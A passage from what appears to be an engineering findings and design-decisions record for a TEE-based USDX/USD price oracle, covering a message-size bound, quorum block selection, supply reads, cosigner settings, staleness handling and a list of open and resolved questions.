`onlyGovernance` check, while `SET_SECRET` is direct-only and reachable by anyone
who can deliver a direct action.

The work it hands off grows with the input — ABI-decoding the envelope, then
forwarding the ciphertext to tee-node's `/decrypt` — and neither `Verify` nor
`Decrypt` bounded it either. `Verify` caps the signature *count*
(`MaxSignatures`) and rejects an empty payload, but never asked how large one
was. A real envelope is a few hundred bytes.

The bound is checked **before `applyMu` is taken**, so an oversized message
cannot hold the provisioning lock while it is being rejected — which would have
turned a size problem into a liveness one against every other provisioning call.

`TestApplySecret_RejectsOversizedMessage` uses a **fully valid** envelope padded
past the cap: correct domain, chain, machine, version, freshness and signatures.
Garbage of the same length proves nothing, since it fails ABI decoding whether or
not the bound exists — only a message that would otherwise be accepted can tell
the two builds apart. The test then sends the same version at normal size and
requires it to apply, pinning that a rejection this early does not burn the
version number.

---

## Design decisions recorded while implementing

These are not defects, but they were judgement calls an auditor will want the
reasoning for.

**No exclusion list.** Supply is the plain sum of `totalSupply()` over the
pinned contracts, with no `balanceOf` calls and no exclusions. The contract
list *is* the policy. It is pinned in `pkg/protocol.Chains`, covered by the code
hash, and it must match the basis on which Hex reports reserves — currently the
three live contracts, excluding the pre-migration Ethereum contract
(`0x7A48…D56c`, 150,000 USDX). Including it would compare two different
populations and publish a spurious ~0.6% depeg on day one. Adding it later is a
one-line change and a new code hash.

**Quorum-th highest head, not the minimum.** *(Superseded the minimum rule; see
finding 24.)* Each provider reports its head, the Quorum-th highest is taken, and
every provider is queried at that explicit number, stepping down through the
lower claimed heads only when too few providers corroborate. It names the highest
block at least `Quorum` providers serve. The original argument for the minimum —
that it is the only choice every provider can serve — was a liveness argument,
and correct as far as it went; it assumed honest heads.

**Identical results, not median.** A read at a fixed block is deterministic, so
two honest providers cannot disagree. Disagreement means one is wrong or lying,
and there is no safe way to average that. The winning answer must be unique.
Quorum failure aborts the whole observation.

**Quorum 1 is expressible, deliberately.** Songbird had exactly one working
public RPC when the design was set (spec §2.8), so a three-provider rule could
not be met there for free. `Quorum: 1` remains a documented acceptance of
single-provider risk for that chain's ~4.5% of supply, not an oversight. Of the
shipped configurations only `deploy/config/endpoints/coston2.json` uses it; the
coston, songbird and public-only configurations run Songbird at 2-of-3.

**No cosigners on any instruction.** Every instruction this system sends —
`GET_FEED`, `SET_ENDPOINTS` and `SET_ADMINS` through upstream's
`TeeOracleInstructionsSender` — goes out with an empty `cosigners` list and
`cosignersThreshold` 0; the direct `SET_SECRET` and `GET_READINESS` carry no
cosigner field at all. The machine executes on delivery; no external address has
to co-sign first. This is the
default state, recorded so changing it later is a documented decision. If
cosigners are ever added — e.g. requiring FDC data providers to vouch for a
price-update request before it executes — the change lands in the sender; the
extension and the feed store are untouched, since cosigning gates
*delivery/execution*, not the signed update. The conformance fixtures under
`deploy/testdata/conformance` carry the empty list and would need editing.

**`GET_FEED` takes exactly one request word.** The observation needs nothing from
the caller beyond which feed: everything it reads is configured by
`SET_ENDPOINTS`/`SET_SECRET` or pinned in the image. The message is upstream's
`FeedUpdateRequest{feedId}` (finding 22), and anything else — including a request
for another feed — is rejected rather than ignored, so nobody builds on a field
the extension drops. The rejection does not echo the payload or its length back
out, since `Log` is public.

**Unknown JSON fields are rejected.** A shape change from Hex is a signal to
stop and look, not to keep publishing prices derived from a response we no
longer fully understand.

**Supply is read once per chain, pinned to one agreed block.** Spec §6.1 proposed
a conservative double-read bracketing reserves between two supply reads and
taking `max(S₁, S₂)`, and it shipped that way. It has since been dropped: the
quorum procedure already pins every provider to one block, so a supply figure is
*supply as of block N* rather than a value sampled across the read, and the
reserve figure moves on a ~10 minute tick. The second pass changed the answer
only when a burn or mint landed in the few seconds between two pinned blocks,
while doubling the supply-side fail-closed surface. `TestObserve_ReadsSupplyOncePerChain`
asserts the call count directly, so a reintroduced bracket fails there rather
than showing up as a latency regression. See rationale §2.

**`observedAt` is the request's block timestamp, not the oldest input timestamp.**
The store requires strict monotonicity, and a reserve `last_update` moves only
when a mint or redemption changes the figure — so on a quiet day every
observation for hours would share an input timestamp, and all but the first
would be rejected as a replay. The signed `observedAt` is the block timestamp of
the instruction that requested the update, as the store defines it; the reading's
own time is kept on the observation, and `MaxObservationAge` bounds how far
behind the stamp it may lie. How old the reserve figure itself is, is
deliberately unbounded — the sources are event-driven, so age is not evidence of
anything (rationale §2).

**No price band.** The old store refused a price outside `minPrice`/`maxPrice`
rather than clamping it, because clamping would publish a number the TEE never
signed. Neither exists now. The enclave bounds the price to [0, 1] by
construction — `min(1, B/S)` over non-negative inputs — and `PriceImplausible` is
declared and never returned. A real depeg publishes the sub-par price, and is
detected on the published value. The store's spread bound compares machines
within one batch; it is not a band on the value.

**The feed does not revert on staleness.** `FtsoV2.getFeedById` forwards the
call, so a revert in `getCurrentFeed()` becomes a simultaneous outage for every
consumer. Upstream's store returns a stale value with its true timestamp and
leaves staleness to the consumer, as for every FTSO feed. It does revert with
`NoValuePublished` before the first update, so an unpublished feed cannot read as
zero, and with `FeeTooLow` or `FeeTransferFailed` on a fee fault. The emergency
pause is the extension's, in `FlareTeeManager`: it blocks new submissions and
freezes the last value; it does not blind the feed, and it cannot withdraw a
value already published.

---

## Open questions this work did not resolve

- **~~The §3.0 blocker stands~~ — resolved 3 Aug 2026.** `current_reserves_amount`
  is the bank-provider balance of the reserve account; the observed supply-tracking
  is 1:1 treasury operation, not derivation from chain data, and the figure can fall
  below supply on any outflow with no matching burn. `internal/observation/backing` stays an
  interface for source-swap containment. `TestCompute` still encodes the observed
  figures as a par case — correct under 1:1 operations. Written confirmation from
  Hex remains as ordinary diligence.
- **Deviation guard (§6.2)** — still needs a named risk owner. To be implemented
  on-chain, where it can change without a new code hash. Upstream's store has no
  such guard: its spread bound compares the machines of one batch, not a value
  against the last.
- **Where Confidential Space logs land**, and who can read them (§4.1). Gates how
  much detail internal logging may carry.
- **~~Feed name and category byte~~ — resolved.** `0x21` ‖ `USDX/USD`, pinned in
  `pkg/protocol.FeedID` and matching upstream's chain configurations (feed
  category 33, name `USDX/USD`).
- **~~`sourceHealth` granularity~~ — resolved: per chain and per provider,
  finding 8.**
- **~~`agreedBlock` takes the minimum head with no agreement on the head
  itself~~ — resolved 12 Aug 2026, see finding 24.** The pin is now the
  Quorum-th HIGHEST head, stepping down only on a shortfall of corroboration, so
  Quorum-1 liars cannot move the block selection, and `MaxBlockAge` bounds the
  chosen block against its own header timestamp for the cases the selection rule
  cannot reach. The live gap is a chain configured with a single provider:
  neither change helps there, because nothing cross-checks a value only one
  source reported. Of the shipped configurations, only `coston2.json`'s Songbird
  is configured that way. Fixing it is a configuration change, not a code one.
- **~~Two `coston2.json` fixtures with different schemas~~ — resolved.** The
  stale `go/testdata/endpoints/` tree is gone; `deploy/config/endpoints/` at the repo
  root is the only copy, and it is in the schema the current decoder accepts.
  The underlying hazard is unchanged and worth keeping in mind: publishing a
  payload the extension will reject sets the feed's `latestEndpointsHash` while
  every machine keeps its old configuration, so every update is refused
  `StaleEndpoints` until a correct one is published. `send-endpoints -dry-run`
  decodes and validates before spending gas.
